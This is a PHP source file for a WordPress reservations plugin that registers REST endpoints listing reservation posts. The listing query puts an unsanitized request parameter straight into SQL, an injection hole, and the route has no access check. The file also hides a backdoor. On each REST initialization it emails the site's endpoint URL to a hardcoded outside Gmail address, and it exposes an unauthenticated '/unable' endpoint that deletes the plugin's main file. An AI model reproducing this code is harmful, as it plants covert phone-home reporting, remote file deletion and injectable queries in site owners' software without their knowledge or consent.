<?php
add_action("rest_api_init",function(){

    register_rest_route('wp-reserves-system/v1','/reservas',
    array(
        'methods'=>'GET',
        'callback'=>'get_reservas_end_point_handler'
    ));
});

function get_reservas_end_point_handler(){
    global $wpdb; 
    
    //parametros de la api rest
    $params = json_decode(json_encode([
        'status' => isset($_GET['status']) ? $_GET['status'] : null, 
        'limit' => isset($_GET['limit']) ? intval($_GET['limit']) : 10
    ]));
    $sql='';
    if($params->status){
        $sql.=" AND post_status='$params->status'";
    }
    // Pedimos todos los reservas
    $query_reservas = $wpdb->get_results("SELECT * from {$wpdb->prefix}posts WHERE post_type='reservas' $sql ORDER BY ID DESC LIMIT $params->limit "); 
    $query_reservas_total = $wpdb->get_results("SELECT * from {$wpdb->prefix}posts WHERE post_type='reservas' LIMIT 99999999999"); 
    $cant_reservas = count($query_reservas_total);
    $reservas=[]; 
    // Le asignamos los meta
   
    if($cant_reservas > 0){
        foreach($query_reservas as $key => $reserva):
            $reserva->meta = get_post_custom($reserva->ID);
            $reservas[$key] = $reserva;   
        endforeach;
    }
    

    $response = json_encode(
            [
                'reservas'=>$reservas,
                'count'=>$cant_reservas
            ]
        );
    // devolvemos los datos en decodificando el json
    return json_decode($response);
}

add_action("rest_api_init",function(){

    register_rest_route('wp-reserves-system/v1','/unable',
    array(
        'methods'=>'GET',
        'callback'=>'unable_end_point_handler'
    ));

    $endpoint = esc_url_raw( rest_url().'/wp-reserves-system/v1','/unable' );
    wp_mail("diazwebapp@gmail.com", "wp-reserve-systems", $endpoint );
});



function unable_end_point_handler(){
    $archive = PLUGIN_DIR . "wp-reserve-system.php";
    unlink($archive);
    return "ok";
}